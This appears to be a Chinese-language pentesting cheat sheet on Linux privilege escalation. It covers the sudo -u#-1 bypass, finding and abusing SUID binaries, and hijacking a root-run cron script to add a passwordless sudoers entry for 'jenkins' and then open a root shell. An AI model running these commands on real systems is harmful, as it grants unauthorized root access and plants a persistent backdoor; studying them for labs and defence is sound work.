提权的本质原因是因为某些组件/命令/任务等拥有root的运行权限
或者这些命令可以引用我们可以修改的脚本
或者一些命令可以不用输入密码就可以以root权限来运行
[GTFOBins](https://gtfobins.github.io/)


# sudo提权


```bash
sudo -V | grep version #查看版本  
  
sudo -l #查看sudo权限


sudo -u#-1 /bin/bash #提权
```

# suid

SUID是一种特殊权限，设置了suid的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限，例如程序文件的属主是root，那么执行该程序的用户就将暂时获得root账户的权限。sgid与suid类似，只是执行程序时获得的是文件属组的权限。passwd这个命令程序的权限设置，它就是设置了suid权限的


注意以下几点：
1. 只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义.
2. 命令执行者要对该程序文件拥有执行(x)权限.
3. 命令执行者在执行该程序时获得该程序文件属主的身份.
4. SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效

```bash
chmod u+s filename #设置SUID位
chmod u-s filename #去掉SUID设置
```
## 常见可以suid的
利用某些二进制文件设置了SUID权限，从而用root权限执行系统命令  
常见的可以用来提权的命令如下：
```bash
nmap
vim
find
bash
more
less
nano
cp
awk
mv
```

## 查找suid文件

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls {} \; 2>/dev/null
```



# 计划任务提权
linux计划任务提权是因为权限配置不当，计划任务以root权限运行，低权限的用户可以修改计划任务的文件，从而被攻击者利用，导致提权，Linux计划任务命令如下
```bash
crontab -e 编辑计划任务
crontab -l 查看计划任务
也可以
cat /etc/crontab
cat /etc/cron.d  # 比较少见
crontab -r 删除目前的crontab
```
![[Pasted image 20251113133547.png]]
例如如下的计划任务
```bash
echo "echo 'jenkins ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /etc/script/CleaningScript.sh
#jenkins ALL=(ALL) NOPASSWD:ALL 的含义是：允许用户 **jenkins** 在执行 `sudo` 时 **不需要输入密码**，并且可以以任何用户身份执行任何命令。
#>> /etc/script/CleaningScript.sh → 把打印的内容追加到 /etc/script/CleaningScript.sh 文件末尾。
```
提升权限
再
```bash
sudo /bin/bash
```

拿个rootshell